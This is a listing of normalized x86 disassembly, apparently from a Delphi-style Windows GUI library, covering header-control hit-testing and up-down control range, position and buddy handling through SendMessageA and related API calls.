mov si 0xffb2
call sub_40358c
jmp r-xdata
sub eax 0xfffffec9
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_437824
mov ebx eax
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x4 ]
cmp eax [ ebx + 0x10 ]
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x211 ] 0x0
je r-xdata
jmp r-xdata
xor eax eax
mov [ edx + 0xc ] eax
call GetMessagePos
and eax 0xffff
mov [ ebp - 0x15 ] eax
lea eax [ ebp - 0x15 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44d7a4
push eax
call ScreenToClient
mov eax [ ebp - 0x4 ]
call sub_4469cc
sar eax 0x1
jns r-xdata
add eax 0xfffffffd
sub eax 0x3
jb r-xdata
mov [ ebx + 0x10 ] eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov si 0xffaf
call sub_40358c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_438a0c
mov [ ebp - 0x11 ] eax
lea eax [ ebp - 0x15 ]
push eax
push 0x0
push 0x1206
mov eax [ ebp - 0x4 ]
call sub_44d7a4
push eax
call SendMessageA
mov [ ebp - 0x39 ] 0x80
cmp [ ebp - 0x9 ] 0x0
jge r-xdata
adc eax 0x0
mov edx [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_437824
mov ebx eax
mov eax [ esi + 0x8 ]
sub eax 0xfffffecd
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_44d7a4
lea ecx [ ebp - 0x39 ]
mov edx [ ebp - 0x9 ]
call sub_42e818
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x19 ]
mov [ eax + 0x21c ] edx
test [ ebp - 0xc ] 0x8
je r-xdata
mov [ ebp - 0x5 ] 0x2
jmp r-xdata
dec eax
jne r-xdata
mov eax [ ebp - 0xd ]
test ah 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x21c ] edx
jmp r-xdata
xor edx edx
push ebp
push sub_438372
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp - 0x5 ] 0x2
je r-xdata
mov [ ebp - 0x5 ] 0x1
mov [ ebp - 0x5 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_41c3c4
dec eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x21c ] eax
jmp r-xdata
test al 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44d7a4
lea ecx [ ebp - 0x39 ]
mov edx [ esi + 0xc ]
call sub_42e818
mov eax [ ebp - 0x4 ]
mov ebx [ ebp - 0x19 ]
mov [ eax + 0x218 ] ebx
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x21c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_437824
push eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_437824
mov edx eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_4387a0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x211 ] al
jmp r-xdata
mov eax [ esi + 0x14 ]
mov esi eax
mov eax [ ebx + 0x14 ]
cmp eax [ esi + 0x4 ]
jle r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] ebx
mov eax [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x234 ] eax
call GetMessagePos
mov edx eax
and edx 0xffff
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x238 ] edx
shr eax 0x10
mov edx [ ebp - 0x4 ]
mov [ edx + 0x23c ] eax
mov eax [ ebp - 0x4 ]
add eax 0x238
push eax
mov eax [ ebp - 0x4 ]
call sub_44d7a4
push eax
call ScreenToClient
mov eax [ ebx + 0x18 ]
cmp eax [ esi + 0x4 ]
jge r-xdata
mov [ esi + 0x4 ] eax
mov al [ ebp - 0x5 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_40358c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x5 ] 0x2
jne r-xdata
mov [ esi + 0x4 ] eax
retn
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x230 ] edx
sub_4384a4
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x220 ] 0x0
je r-xdata
xor eax eax
pop ecx
pop ebp
retn
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x0
push 0x26
call SystemParametersInfoA
test eax eax
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov al 0x1
pop ecx
pop ebp
retn
sub_4384dc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
cmp [ edi ] 0x200
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_44b180
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
push ebp
call sub_4384a4
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4471ac
test al al
je r-xdata
movsx ebx [ edi + 0x8 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x238 ]
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x234 ]
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x230 ]
mov eax [ esi + 0x14 ]
cmp ebx eax
jge r-xdata
mov eax [ esi + 0x18 ]
cmp ebx eax
jle r-xdata
sub ebx eax
mov [ ebp - 0x5 ] 0x1
push 0x1
mov edx esi
mov ecx ebx
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_40358c
cmp [ ebp - 0x5 ] 0x0
je r-xdata
sub ebx eax
mov [ ebp - 0x5 ] 0x1
sub [ edi + 0x8 ] bx
sub_438580
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov ebx eax
movsx eax [ edi + 0x8 ]
mov [ esp ] eax
movsx eax [ edi + 0xa ]
mov [ esp + 0x4 ] eax
mov eax esp
push eax
push 0x0
push 0x1206
mov eax ebx
call sub_44d7a4
push eax
call SendMessageA
mov esi eax
test esi esi
jl r-xdata
mov edx edi
mov eax ebx
call sub_448608
test [ esp + 0x8 ] 0x2
je r-xdata
mov edx esi
mov eax [ ebx + 0x208 ]
call sub_437824
cmp [ eax + 0x1e ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_4385e0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44bd58
mov eax [ ebp - 0x4 ]
call sub_44daa8
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x2
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ ebp - 0x14 ] eax
xor edx edx
push ebp
push sub_43877b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_446988
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_41c3c4
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
inc edi
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_403390
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor edx edx
push ebp
push sub_43875e
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ esi + 0x10 ]
sub [ ebp - 0xc ] eax
mov edx esi
mov eax [ ebp - 0x14 ]
call sub_41b4f8
jmp r-xdata
mov eax [ ebp - 0xc ]
cdq
idiv [ ebp - 0x8 ]
mov edi eax
mov ebx [ ebp - 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_41b654
mov esi eax
test ebx ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx ebx
call sub_437824
mov esi eax
cmp [ esi + 0x1f ] 0x0
je r-xdata
inc ebx
dec edi
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_41b654
mov esi eax
test ebx ebx
jne r-xdata
mov edx edi
mov eax esi
call sub_43777c
dec ebx
cmp ebx 0xffffffff
jne r-xdata
add edi [ ebp - 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
cmp eax [ ebp - 0x8 ]
jne r-xdata
cmp edi [ esi + 0x10 ]
je r-xdata
add edi [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
cdq
idiv [ ebp - 0x8 ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cdq
idiv [ ebp - 0x8 ]
mov edi eax
mov ebx [ ebp - 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_41b544
mov eax [ esi + 0x10 ]
sub [ ebp - 0xc ] eax
sub_4387a0
push esi
push edi
push ecx
mov edi edx
mov esi eax
mov [ esp ] 0x1
push esp
mov edx edi
mov eax esi
mov si 0xffb1
call sub_40358c
mov al [ esp ]
pop edx
pop edi
pop esi
retn
sub_4387c0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_446454
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x228 ]
jne r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xd0 ]
sub_4387f4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x228 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x228 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x224 ]
call sub_454b48
mov eax ebx
call sub_44d7a4
xor edx edx
call sub_42e834
mov edx [ ebx + 0x224 ]
call sub_454b8c
mov edx ebx
mov eax [ ebx + 0x228 ]
call sub_423b78
mov eax [ ebx + 0x228 ]
call sub_4541b8
push eax
mov eax ebx
call sub_44d7a4
pop edx
call sub_42e834
jmp r-xdata
mov eax ebx
call sub_438048
pop esi
pop ebx
retn
sub_438868
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4541b8
push eax
mov eax ebx
call sub_44d7a4
pop edx
call sub_42e834
mov eax ebx
call sub_438048
pop esi
pop ebx
retn
sub_438890
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x262 ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x264 ]
call [ ebx + 0x260 ]
sub_4388e0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4389ff
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ eax + 0x210 ] 0x1
xor eax eax
push ebp
push sub_4389dc
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebx + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_41c364
push eax
mov eax esi
call sub_41c034
mov edx eax
pop eax
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_41c3c4
push eax
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405384
add esp 0x4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_41c3c4
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_41c3c4
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_44d7a4
mov ecx [ ebp - 0x4 ]
pop edx
call sub_42e844
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4389e3
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ eax + 0x210 ] 0x0
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx ebx
call sub_437824
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + ebx * 4 ] eax
inc ebx
dec esi
jne r-xdata
sub_438a0c
push ebp
mov ebp esp
push ecx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x211 ] 0x0
push ebp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x21c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_437824
push eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x218 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_437824
pop edx
call sub_4388e0
pop ecx
mov eax [ ebp - 0x4 ]
mov si 0xffb0
call sub_40358c
pop esi
pop ecx
pop ebp
retn
sub_438a88
push ebx
push ecx
mov ebx eax
mov eax [ r-xdata ]
mov [ esp ] eax
cmp [ ebx + 0x272 ] 0x0
je r-xdata
mov ecx [ ebx + 0x208 ]
mov dl 0x1
mov eax [ esp ]
call [ eax + 0x1c ]
pop edx
pop ebx
retn
mov ecx esp
mov edx ebx
mov eax [ ebx + 0x274 ]
call [ ebx + 0x270 ]
sub_438af8
push ebp
mov ebp esp
push ecx
push ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_449498
push 0x2
call GetSystemMetrics
mov edx eax
mov eax ebx
call sub_446740
push 0x14
call GetSystemMetrics
mov edx eax
mov eax ebx
call sub_446764
mov eax [ ebx + 0x4c ]
mov edx eax
sar eax 0x1
jns r-xdata
add esp 0xfffffff0
call sub_4036f4
add edx eax
mov eax ebx
call sub_446764
mov [ ebx + 0x208 ] 0x1
mov [ ebx + 0x21f ] 0x0
mov [ ebx + 0x21c ] 0x0
mov [ ebx + 0x210 ] 0x0
mov [ ebx + 0x212 ] 0x64
mov [ ebx + 0x214 ] 0x1
mov [ ebx + 0x228 ] 0x1
mov [ ebx + 0x229 ] 0x1
mov [ ebx + 0x21e ] 0x1
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
adc eax 0x0
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_438bc4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax 0x10
call sub_43749c
mov edx ebx
mov eax esi
call sub_44a5f8
or [ ebx + 0x4 ] 0x2
cmp [ esi + 0x228 ] 0x1
jne r-xdata
or [ ebx + 0x4 ] 0x8
or [ ebx + 0x4 ] 0x4
jmp r-xdata
cmp [ esi + 0x208 ] 0x0
je r-xdata
or [ ebx + 0x4 ] 0x40
cmp [ esi + 0x229 ] 0x0
jne r-xdata
cmp [ esi + 0x21e ] 0x0
jne r-xdata
or [ ebx + 0x4 ] 0x20
cmp [ esi + 0x21f ] 0x0
je r-xdata
or [ ebx + 0x4 ] 0x80
mov ecx r-xdata
mov edx ebx
mov eax esi
call sub_44a524
mov eax [ ebx + 0x24 ]
and eax 0xfffffffc
or eax 0x8
mov [ ebx + 0x24 ] eax
pop esi
pop ebx
retn
or [ ebx + 0x4 ] 0x1
sub_438c58
push ebx
push esi
add esp 0xfffffff8
mov ebx eax
mov esi [ ebx + 0x48 ]
mov eax ebx
call sub_44a724
mov eax [ ebx + 0x20c ]
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_446740
mov dx [ ebx + 0x210 ]
mov ax [ ebx + 0x212 ]
call sub_406e80
push eax
push 0x0
push 0x465
mov eax ebx
call sub_44d7a4
push eax
call SendMessageA
xor edx edx
mov ax [ ebx + 0x21c ]
call sub_406e80
push eax
push 0x0
push 0x467
mov eax ebx
call sub_44d7a4
push eax
call SendMessageA
mov eax esp
push eax
push 0x1
push 0x46c
mov eax ebx
call sub_44d7a4
push eax
call SendMessageA
mov eax [ ebx + 0x214 ]
mov [ esp + 0x4 ] eax
mov eax esp
push eax
push 0x1
push 0x46b
mov eax ebx
call sub_44d7a4
push eax
call SendMessageA
pop ecx
pop edx
pop esi
pop ebx
retn
mov edx eax
mov eax ebx
call sub_43917c
push 0x0
mov eax [ ebx + 0x20c ]
call sub_44d7a4
push eax
push 0x469
mov eax ebx
call sub_44d7a4
push eax
call SendMessageA
sub_438d30
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ edi + 0x4 ] 0x4
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov ax [ edi + 0x6 ]
mov dx [ ebx + 0x21c ]
cmp ax dx
jle r-xdata
cmp dx ax
jle r-xdata
xor edx edx
mov eax ebx
mov si 0xffb2
call sub_40358c
jmp r-xdata
mov ax [ edi + 0x6 ]
mov [ ebx + 0x21c ] ax
mov dl 0x1
mov eax ebx
mov si 0xffb2
call sub_40358c
sub_438d88
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_44bd58
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0x0
lea eax [ esp + 0x4 ]
push eax
mov eax ebx
call sub_44d7a4
push eax
call InvalidateRect
add esp 0x10
pop ebx
retn
sub_438db8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ edi + 0x4 ] 0x4
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov ax [ edi + 0x6 ]
mov dx [ ebx + 0x21c ]
cmp ax dx
jle r-xdata
cmp dx ax
jle r-xdata
xor edx edx
mov eax ebx
mov si 0xffb2
call sub_40358c
jmp r-xdata
mov ax [ edi + 0x6 ]
mov [ ebx + 0x21c ] ax
mov dl 0x1
mov eax ebx
mov si 0xffb2
call sub_40358c
sub_438e2c
push ebx
push esi
push ecx
mov esi eax
mov [ esp ] 0x1
xor ebx ebx
mov ax [ esi + 0x218 ]
cmp ax [ esi + 0x210 ]
jge r-xdata
mov ax [ esi + 0x218 ]
cmp ax [ esi + 0x212 ]
jle r-xdata
cmp [ esi + 0x21a ] 0x0
jl r-xdata
mov ax [ esi + 0x21a ]
test ax ax
jge r-xdata
cmp [ esi + 0x21a ] 0x0
jle r-xdata
xor ebx ebx
jmp r-xdata
test ax ax
jle r-xdata
mov bl 0x2
jmp r-xdata
cmp [ esi + 0x232 ] 0x0
je r-xdata
mov bl 0x1
cmp [ esi + 0x23a ] 0x0
je r-xdata
mov ecx esp
mov edx esi
mov eax [ esi + 0x234 ]
call [ esi + 0x230 ]
mov al [ esp ]
pop edx
pop esi
pop ebx
retn
mov ax [ esi + 0x218 ]
push eax
push ebx
lea ecx [ esp + 0x8 ]
mov edx esi
mov eax [ esi + 0x23c ]
call [ esi + 0x238 ]
sub_438ee8
push ebx
push esi
push edi
push ebp
mov ebx edx
mov edi eax
mov esi [ ebx + 0x8 ]
cmp [ esi + 0x8 ] 0xfffffd2e
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov dx [ esi + 0xc ]
mov bp [ esi + 0x10 ]
add dx bp
mov ecx ebp
mov eax edi
call sub_438e10
xor al 0x1
neg al
sbb eax eax
mov [ ebx + 0xc ] eax
sub_438f40
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov bl 0x1
test edi edi
je r-xdata
xor ebx ebx
mov edx esi
mov eax edi
call sub_4032f4
test al al
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40331c
mov edi eax
test edi edi
jne r-xdata
sub_438f70
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43914e
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
cmp [ ebx + 0x20c ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
call sub_44a49c
dec eax
test eax eax
jl r-xdata
test esi esi
je r-xdata
mov eax ebx
call sub_44daa8
test al al
je r-xdata
inc eax
mov [ ebp - 0x4 ] eax
xor edi edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439155
lea eax [ ebp - 0x18 ]
call sub_404120
retn
mov eax [ esi + 0x30 ]
cmp eax [ ebx + 0x30 ]
jne r-xdata
xor eax eax
mov [ ebx + 0x20c ] eax
push 0x0
push 0x0
push 0x469
mov eax ebx
call sub_44d7a4
push eax
call SendMessageA
inc edi
dec [ ebp - 0x4 ]
jne r-xdata
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_44a460
cmp ebx eax
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40351c
test al al
jne r-xdata
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_44a460
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_44a460
cmp esi [ eax + 0x20c ]
jne r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_40351c
test al al
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_44a460
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd3c
call sub_403b5c
mov eax esi
mov edx [ rw-data ]
call sub_40351c
test al al
jne r-xdata
mov eax esi
call sub_4032d8
mov edx r-xdata
call sub_438f40
test al al
jne r-xdata
mov eax esi
call sub_4032d8
mov edx r-xdata
call sub_438f40
test al al
jne r-xdata
mov eax ebx
call sub_44daa8
test al al
je r-xdata
mov [ ebx + 0x20c ] esi
mov eax esi
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_43917c
push 0x0
mov eax esi
call sub_44d7a4
push eax
push 0x469
mov eax ebx
call sub_44d7a4
push eax
call SendMessageA
lea edx [ ebp - 0x18 ]
movsx eax [ ebx + 0x21c ]
call sub_4085c0
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_446fb4
sub_43917c
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
mov esi [ ebx + 0x48 ]
mov edi [ ebx + 0x40 ]
push 0x0
mov eax ebx
call sub_44d7a4
push eax
push 0x469
mov eax ebp
call sub_44d7a4
push eax
call SendMessageA
mov eax [ ebx + 0x48 ]
mov edx [ ebx + 0x40 ]
mov ecx esi
sub ecx eax
mov eax ecx
mov ebp edx
sub ebp edi
lea edx [ eax + esi ]
mov eax ebx
call sub_446740
mov edx edi
sub edx ebp
mov eax ebx
call sub_4466f4
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4391d0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_446454
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x20c ]
jne r-xdata
mov eax edi
call sub_44daa8
test al al
je r-xdata
push 0x0
push 0x0
push 0x469
mov eax edi
call sub_44d7a4
push eax
call SendMessageA
xor eax eax
mov [ edi + 0x20c ] eax
sub_439220
push ebx
mov ebx eax
mov eax ebx
call sub_44daa8
test al al
je r-xdata
mov ax [ ebx + 0x21c ]
pop ebx
retn
push 0x0
push 0x0
push 0x468
mov eax ebx
call sub_44d7a4
push eax
call SendMessageA
mov [ ebx + 0x21c ] ax
pop ebx
retn
sub_439258
push ebx
mov ebx eax
cmp dx [ ebx + 0x210 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x210 ] dx
mov eax ebx
call sub_44daa8
test al al
je r-xdata
mov dx [ ebx + 0x210 ]
mov ax [ ebx + 0x212 ]
call sub_406e80
push eax
push 0x0
push 0x465
mov eax ebx
call sub_44d7a4
push eax
call SendMessageA
sub_4392a0
push ebx
mov ebx eax
cmp dx [ ebx + 0x212 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x212 ] dx
mov eax ebx
call sub_44daa8
test al al
je r-xdata
mov dx [ ebx + 0x210 ]
mov ax [ ebx + 0x212 ]
call sub_406e80
push eax
push 0x0
push 0x465
mov eax ebx
call sub_44d7a4
push eax
call SendMessageA
sub_4392e8
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x214 ]
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov [ ebx + 0x214 ] esi
mov eax ebx
call sub_44daa8
test al al
je r-xdata
mov eax esp
push eax
push 0x1
push 0x46c
mov eax ebx
call sub_44d7a4
push eax
call SendMessageA
mov [ esp + 0x4 ] esi
mov eax esp
push eax
push 0x1
push 0x46b
mov eax ebx
call sub_44d7a4
push eax
call SendMessageA
sub_439344
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_439410
push [ fs : eax ]
mov [ fs : eax ] esp
mov di [ ebx + 0x21c ]
cmp si di
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439417
lea eax [ ebp - 0x4 ]
call sub_404120
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov [ ebx + 0x21c ] si
test [ ebx + 0x1c ] 0x10
je r-xdata
mov ecx esi
sub cx di
mov edx esi
mov eax ebx
call sub_438e10
test al al
je r-xdata
mov eax ebx
call sub_44daa8
test al al
je r-xdata
cmp [ ebx + 0x20c ] 0x0
je r-xdata
xor edx edx
mov ax [ ebx + 0x21c ]
call sub_406e80
push eax
push 0x0
push 0x467
mov eax ebx
call sub_44d7a4
push eax
call SendMessageA
mov esi [ ebx + 0x20c ]
mov eax esi
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x21c ]
call sub_4085c0
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_446fb4
sub_439420
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x229 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x229 ] dl
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov eax ebx
call sub_44daa8
test al al
je r-xdata
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x84 ]
mov eax ebx
call sub_44ad0c
push 0x0
push 0x0
push 0x469
mov eax ebx
call sub_44d7a4
push eax
call SendMessageA
sub_439494
push ebx
mov ebx eax
cmp dl [ ebx + 0x228 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x228 ] dl
mov eax ebx
call sub_44daa8
test al al
je r-xdata
mov eax ebx
call sub_44ad0c
push 0x0
push 0x0
push 0x469
mov eax ebx
call sub_44d7a4
push eax
call SendMessageA
sub_4394d0
push ebx
mov ebx eax
cmp dl [ ebx + 0x208 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x208 ] dl
mov eax ebx
call sub_44daa8
test al al
je r-xdata
mov eax ebx
call sub_44ad0c
push 0x0
push 0x0
push 0x469
mov eax ebx
call sub_44d7a4
push eax
call SendMessageA
sub_43950c
push ebx
mov ebx eax
cmp dl [ ebx + 0x21e ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x21e ] dl
mov eax ebx
call sub_44daa8
test al al
je r-xdata
mov eax ebx
call sub_44ad0c
push 0x0
push 0x0
push 0x469
mov eax ebx
call sub_44d7a4
push eax
call SendMessageA
sub_439548
push ebx
mov ebx eax
cmp dl [ ebx + 0x21f ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x21f ] dl
mov eax ebx
call sub_44daa8
test al al
je r-xdata
mov eax ebx
call sub_44ad0c
push 0x0
push 0x0
push 0x469
mov eax ebx
call sub_44d7a4
push eax
call SendMessageA
sub_439588
